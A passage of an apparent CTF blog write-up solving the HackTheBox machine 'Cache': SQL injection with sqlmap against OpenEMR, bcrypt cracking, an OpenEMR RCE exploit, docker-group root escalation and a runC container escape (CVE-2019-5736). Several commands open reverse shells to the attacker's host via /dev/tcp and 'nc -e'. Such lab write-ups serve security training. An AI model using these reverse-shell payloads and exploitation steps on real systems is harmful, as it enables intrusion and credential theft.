&#x27;information_schema&#x27;</span></span><br><span class="line"><span class="string">[10:44:25] [INFO] retrieved: &#x27;openemr&#x27;</span></span><br><span class="line"><span class="string">available databases [2]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] openemr</span></span><br></pre></td></tr></table></figure>

<p>Well that’s no surprise here. According to OpenEMR documentation, the admin user accounts are stored in the <code>users_secure</code> table. Let’s dump it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">&quot;http://hms.htb/portal/find_appt_popup_user.php?catid=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=fobps042o1oh4u325nqk3jnniv; OpenEMR=qsvth3m6bqdgnusejnn36bd1pe&quot;</span> -D openemr -T users_secure --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.4#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&#x27;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&quot;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[10:47:56] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;users_secure&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;openemr&#x27;</span></span><br><span class="line">[10:47:56] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[10:47:56] [INFO] retrieved: <span class="string">&#x27;id&#x27;</span></span><br><span class="line">[10:47:56] [INFO] retrieved: <span class="string">&#x27;username&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;password&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;salt&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;last_update&#x27;</span></span><br><span class="line">[10:47:57] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;users_secure&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;openemr&#x27;</span></span><br><span class="line">[10:47:57] [INFO] retrieved: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;2019-11-21 06:38:40&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;$2a$05$l2sTLIG6GTBeyBf7TAKL6A$&#x27;</span></span><br><span class="line">[10:47:58] [INFO] retrieved: <span class="string">&#x27;openemr_admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Alright,  we got <code>openemr_admin</code> password hash and password salt. </p>
<h3 id="Admin-hash-bruteforce"><a href="#Admin-hash-bruteforce" class="headerlink" title="Admin hash bruteforce"></a>Admin hash bruteforce</h3><p>The easiest way to authenticate to OpenEMR and achieve Remote Code Execution is to bruteforce the <code>openemr_admin</code> password hash we found earlier. At first look it seems like <code>bcrypt</code> hash. </p>
<p><code>hashid</code> can confirm our guess:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ hashid <span class="string">&quot;\$2a\$05\$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&quot;</span> -mj</span><br><span class="line">Analyzing <span class="string">&#x27;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#x27;</span></span><br><span class="line">[+] Blowfish(OpenBSD)</span><br><span class="line">[+] Woltlab Burning Board 4.x</span><br><span class="line">[+] bcrypt [Hashcat Mode: 3200][JtR Format: bcrypt]</span><br></pre></td></tr></table></figure>

<p>Let’s now use <code>john</code> to see if we can easily brute-force the hash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt hash.txt</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">xxxxxx           (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-05-10 16:48) 3.448g/s 2917p/s 2917c/s 2917C/s tristan..princesita</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>Alright, we got the admin credentials: <code>openemr_admin</code>:<code>xxxxxx</code>. We can login on OpenEMR portal to make sure the informations are correct and move to the next step: Remote Code Execution.</p>
<img width="1134" alt="openemr admin login" src="https://user-images.githubusercontent.com/9076747/82307383-93c2a900-99c0-11ea-8321-a09b198be3f2.png">

<h3 id="OpenEMR-Authenticated-Remote-Code-Execution"><a href="#OpenEMR-Authenticated-Remote-Code-Execution" class="headerlink" title="OpenEMR Authenticated Remote Code Execution"></a>OpenEMR Authenticated Remote Code Execution</h3><p>Coming from the same team who made the vulnerability report on OpenCRM we found earlier this Authenticated Remote Code Execution exploit on <code>searchsploit</code>. After a quick review nothing need to be changed to make it work on our instance. Let’s give it a try to open a reverse shell.</p>
<p>First let’s open our listener as usual:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cp /usr/share/exploitdb/exploits/php/webapps/45161.py openemr-rce.py</span><br><span class="line">[hg8@archbook ~]$ python openemr-rce.py http://hms.htb -u openemr_admin -p xxxxxx -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1&#x27;</span></span><br><span class="line"> .---.  ,---.  ,---.  .-. .-.,---.          ,---.</span><br><span class="line">/ .-. ) | .-.\ | .-<span class="string">&#x27;  |  \| || .-&#x27;</span>  |\    /|| .-.\</span><br><span class="line">| | |(_)| |-<span class="string">&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;</span>/</span><br><span class="line">| | | | | |--<span class="string">&#x27; | .-&#x27;</span>  | |\  || .-<span class="string">&#x27;  (_)\/  ||   (</span></span><br><span class="line"><span class="string">\ `-&#x27;</span> / | |    |  `--.| | |)||  `--.| \  / || |\ \</span><br><span class="line"> )---<span class="string">&#x27;  /(     /( __.&#x27;</span>/(  (_)/( __.<span class="string">&#x27;| |\/| ||_| \)\</span></span><br><span class="line"><span class="string">(_)    (__)   (__)   (__)   (__)    &#x27;</span>-<span class="string">&#x27;  &#x27;</span>-<span class="string">&#x27;    (__)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   =&#123;   P R O J E C T    I N S E C U R I T Y   &#125;=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         Twitter : @Insecurity</span></span><br><span class="line"><span class="string">         Site    : insecurity.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[$] Authenticating with openemr_admin:xxxxxx</span></span><br><span class="line"><span class="string">[$] Injecting payload</span></span><br></pre></td></tr></table></figure>

<p>And we get a new connection on our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.188:59554</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br></pre></td></tr></table></figure>

<p>Quickly we can see we need to pivot to <code>ash</code> user:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/var/www/html$ ls -l /home/ash</span><br><span class="line">drwxrwxr-x  2 root root  4096 May  5 11:17 Desktop</span><br><span class="line">drwxrwxr-x  2 root root  4096 Oct  9  2019 Documents</span><br><span class="line">drwxrwxr-x  2 root root  4096 Sep 18  2019 Downloads</span><br><span class="line">drwxrwxr-x  2 root root  4096 Sep 18  2019 Music</span><br><span class="line">drwxrwxr-x  2 root root  4096 Sep 18  2019 Pictures</span><br><span class="line">drwxrwxr-x  2 root root  4096 Oct  9  2019 Public</span><br><span class="line">-r-x------  1 ash  ash     33 May 10 16:27 user.txt</span><br></pre></td></tr></table></figure>

<h3 id="Pivot-www-data-gt-ash"><a href="#Pivot-www-data-gt-ash" class="headerlink" title="Pivot www-data -&gt; ash"></a>Pivot www-data -&gt; ash</h3><p>First let’s upgrade our shell to ease our recon:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/$ python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@cache:/$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">www-data@cache:/$ <span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line">www-data@cache:/$ ^Z</span><br><span class="line">[1]+  Stopped        nc -l -vv -p 8585</span><br><span class="line">[hg8@archbook ~]$ stty raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br><span class="line">nc -l -vv -p 8585</span><br><span class="line">www-data@cache:/$                reset</span><br><span class="line">www-data@cache:/$ </span><br></pre></td></tr></table></figure>

<p>With this fully interactive shell we can now try to pivot to <code>ash</code> user using the credentials we found earlier. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/$ su - ash</span><br><span class="line">Password: H@v3_fun</span><br><span class="line">ash@cache:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  user.txt</span><br><span class="line">ash@cache:~$ cat user.txt</span><br><span class="line">exxxxxxxxxxxxxxxxxxxx8</span><br></pre></td></tr></table></figure>



<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>While doing our various usual recon task we notice a service listening on <code>11211</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:~$ netstat -l</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State</span><br><span class="line">tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 localhost.localdo:mysql 0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 localhost.localdo:11211 0.0.0.0:*               LISTEN</span><br><span class="line">tcp6       0      0 [::]:http               [::]:*                  LISTEN</span><br><span class="line">tcp6       0      0 [::]:ssh                [::]:*                  LISTEN</span><br><span class="line">tcp6       0      0 [::]:11211              [::]:*                  LISTEN</span><br><span class="line">udp        0      0 localhost:domain        0.0.0.0:*</span><br><span class="line">raw6       0      0 [::]:ipv6-icmp          [::]:*                  7</span><br></pre></td></tr></table></figure>

<p>Port <code>11211</code> correspond to <a target="_blank" rel="noopener" href="https://memcached.org/">Memcached</a>:</p>
<blockquote>
<p>Memcached is a high-performance, distributed memory object caching system, generic in nature, but intended for use in speeding up dynamic web applications by alleviating database load.</p>
<p>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering.</p>
<p><a target="_blank" rel="noopener" href="https://memcached.org/">https://memcached.org/</a></p>
</blockquote>
<p>Given the name of the box, digging into the Memcached service might be worth it… </p>
<h3 id="Memcached-enumeration"><a href="#Memcached-enumeration" class="headerlink" title="Memcached enumeration"></a>Memcached enumeration</h3><p>According to the <a target="_blank" rel="noopener" href="https://github.com/memcached/memcached/blob/master/doc/protocol.txt">documentation</a> connecting to port <code>11211</code> from <code>localhost</code> allows to <a target="_blank" rel="noopener" href="https://amriunix.com/post/memcached-enumeration/">enumerate objects stored</a>:</p>
<p>First let’s connect to memcached using <code>telnet</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ash@cache:~$ telnet localhost 11211</span><br><span class="line">telnet localhost 11211</span><br><span class="line">Connected to localhost.localdomain.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">version</span><br><span class="line">VERSION 1.5.6 Ubuntu</span><br></pre></td></tr></table></figure>

<p>Let’s print memory statistics with <code>stats slabs</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">stats slabs</span><br><span class="line">STAT 1:chunk_size 96</span><br><span class="line">STAT 1:chunks_per_page 10922</span><br><span class="line">STAT 1:total_pages 1</span><br><span class="line">STAT 1:total_chunks 10922</span><br><span class="line">STAT 1:used_chunks 5</span><br><span class="line">STAT 1:free_chunks 10917</span><br><span class="line">STAT 1:free_chunks_end 0</span><br><span class="line">STAT 1:mem_requested 371</span><br><span class="line">STAT 1:get_hits 0</span><br><span class="line">STAT 1:cmd_set 291</span><br><span class="line">STAT 1:delete_hits 0</span><br><span class="line">STAT 1:incr_hits 0</span><br><span class="line">STAT 1:decr_hits 0</span><br><span class="line">STAT 1:cas_hits 0</span><br><span class="line">STAT 1:cas_badval 0</span><br><span class="line">STAT 1:touch_hits 0</span><br><span class="line">STAT active_slabs 1</span><br><span class="line">STAT total_malloced 1048576</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>We have only one object in memory. Let’s fetch the key’s names associated with this one:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stats cachedump 1 0</span><br><span class="line">ITEM link [21 b; 0 s]</span><br><span class="line">ITEM user [5 b; 0 s]</span><br><span class="line">ITEM passwd [9 b; 0 s]</span><br><span class="line">ITEM file [7 b; 0 s]</span><br><span class="line">ITEM account [9 b; 0 s]</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>Looks good! We have a user and password key. Let’s dump the values stored in it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">get link</span><br><span class="line">VALUE link 0 21</span><br><span class="line">https://hackthebox.eu</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line">get user</span><br><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line">get passwd</span><br><span class="line">get passwd</span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<h3 id="Pivot-ash-gt-luffy"><a href="#Pivot-ash-gt-luffy" class="headerlink" title="Pivot ash -&gt; luffy"></a>Pivot ash -&gt; luffy</h3><p>Since we have <code>luffy</code> credentials let’s just try to login through SSH:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh luffy@cache.htb</span><br><span class="line">luffy@cache.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-99-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed May  6 08:54:44 2020 from 10.10.14.3</span></span><br><span class="line"><span class="string">luffy@cache:~$ </span></span><br></pre></td></tr></table></figure>

<p>Alright we are now logged as <code>luffy</code>. Uppon quick enumeration we noticed <code>luffy</code> is hosting docker:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ groups</span><br><span class="line">luffy docker</span><br><span class="line">luffy@cache:~$ ip a</span><br><span class="line">[...]</span><br><span class="line">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:a1:bd:9d:e8  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">     </span><br></pre></td></tr></table></figure>

<h3 id="Docker-Privilege-Escalation"><a href="#Docker-Privilege-Escalation" class="headerlink" title="Docker Privilege Escalation"></a>Docker Privilege Escalation</h3><p>Belonging to <code>docker</code> group gives extra permissions related to docker. This is going to allow us to use the widely know docker privilege escalation technique which consist in using the permission to run container with host mounted volumes. Let’s see how it’s done.</p>
<p>First we need to have a docker image available. It’s our luck there is an <code>ubuntu</code> image already installed:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:/$  docker image list</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB</span><br></pre></td></tr></table></figure>

<p>Then we can spawn an interactive <code>root</code> shell alongside the <code>-v</code> option to mount the entire filesystem of the host to the <code>ubuntu</code> container:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:/tmp$ docker run -v /:/mnt -it ubuntu chroot /mnt sh</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">3xxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure>



<h2 id="“Intended”-way-to-root"><a href="#“Intended”-way-to-root" class="headerlink" title="“Intended” way to root"></a>“Intended” way to root</h2><p>While I am pretty sure this is the indented way to <code>root</code>  most people probably missed/skipped it for the easiest version from Docker group privilege escalation. </p>
<p>With that being said let’s see this second way to root.</p>
<p>Uppon checking the docker version we notice it’s an old one (<code>18.09.2</code>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ luffy@cache:~$ docker --version</span><br><span class="line">Docker version 18.09.1, build 4c52b90   </span><br></pre></td></tr></table></figure>

<p><code>Searhsploit</code> returns an interesting result for this version:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit docker</span><br><span class="line">----------------------------------------------------------- -----------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">                                                           | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------- -----------------------------------</span><br><span class="line">[...]</span><br><span class="line">runc &lt; 1.0-rc6 (Docker &lt; 18.09.2) - Container Breakout (2) | exploits/linux/<span class="built_in">local</span>/46369.md</span><br><span class="line">----------------------------------------------------------- -----------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>Let’s dig in!</p>
<h3 id="Docker-container-escape-via-runC-CVE-2019-5736"><a href="#Docker-container-escape-via-runC-CVE-2019-5736" class="headerlink" title="Docker container escape via runC (CVE-2019-5736)"></a>Docker container escape via runC (CVE-2019-5736)</h3><p>The <a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2019/02/11/2">advisory</a> on this CVE describe the issue this way:</p>
<blockquote>
<p>The vulnerability allows a malicious container to overwrite the host runc binary and thus gain root-level<br>code execution on the host. The level of user interaction is being able to run any command as root within a container in either of these contexts:</p>
<ul>
<li>Creating a new container using an attacker-controlled image.</li>
<li>Attaching (docker exec) into an existing container which the<br>attacker had previous write access to.</li>
</ul>
<p>This vulnerability is <em>not</em> blocked by the default AppArmor policy, nor<br>by the default SELinux policy on Fedora. […]</p>
<p><a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2019/02/11/2">https://www.openwall.com/lists/oss-security/2019/02/11/2</a></p>
</blockquote>
<p>Sounds like exactly our context. We can even find a <a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">Proof Of Concept on Github</a>. Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/Frichetten/CVE-2019-5736-PoC.git</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> CVE-2019-5736-PoC/</span><br></pre></td></tr></table></figure>

<p>We need to edit the <code>main.go</code> payload in order to open a reverse shell:</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- var payload = &quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span></span><br><span class="line"><span class="addition">+ var payload = &quot;#!/bin/bash \n /tmp/nc -e /bin/bash 172.18.0.1 8585&quot; </span></span><br></pre></td></tr></table></figure>

<p>Then we can build the exploit and send it alongside a copy of <code>netcat</code> to the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ go build main.go</span><br><span class="line">[hg8@archbook ~]$ scp nc main luffy@cache:~$:/tmp/.hg8</span><br></pre></td></tr></table></figure>

<p>We have everything ready, let’s open our <code>nc</code> listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>

<p>And finally run the exploit:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:/tmp/.hg8$ docker run --rm --name pwnme -dit ubuntu bash</span><br><span class="line">7d998e09dd6fece9947f744eb945e60eb755a6862898958dd4ef3fb954111063</span><br><span class="line">luffy@cache:/tmp/.hg8$ docker cp main pwnme:/tmp/CVE-2019-5736</span><br><span class="line">luffy@cache:/tmp/.hg8$ docker cp nc pwnme:/tmp/nc</span><br><span class="line">luffy@cache:/tmp/.hg8$ docker attach pwnme</span><br><span class="line">root@7d998e09dd6f:/<span class="comment"># chmod +x /tmp/CVE-2019-5736</span></span><br><span class="line">root@7d998e09dd6f:/<span class="comment"># ./tmp/CVE-2019-5736</span></span><br><span class="line">[+] Overwritten /bin/sh successfully</span><br></pre></td></tr></table></figure>

<p>At this point we open a new SSH connection as <code>luffy</code> and open a new <code>sh</code> shell from the <code>pwnme</code> container:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">luffy@cache:~$ docker <span class="built_in">exec</span> -it pwnme /bin/sh</span><br><span class="line">No <span class="built_in">help</span> topic <span class="keyword">for</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>And we get a new connection on our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.188:44040</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br><span class="line">$ cat /root/root.txt</span><br><span class="line">3xxxxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure>



<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Medium-Box/">Medium Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE-2019-5736/" rel="tag">CVE-2019-5736</a>, <a class="tag-link-link" href="/tags/John/" rel="tag">John</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/bcrypt/" rel="tag">bcrypt</a>, <a class="tag-link-link" href="/tags/cache/" rel="tag">cache</a>, <a class="tag-link-link" href="/tags/docker/" rel="tag">docker</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/memcached/" rel="tag">memcached</a>, <a class="tag-link-link" href="/tags/openerm/" rel="tag">openerm</a>, <a class="tag-link-link" href="/tags/sqli/" rel="tag">sqli</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
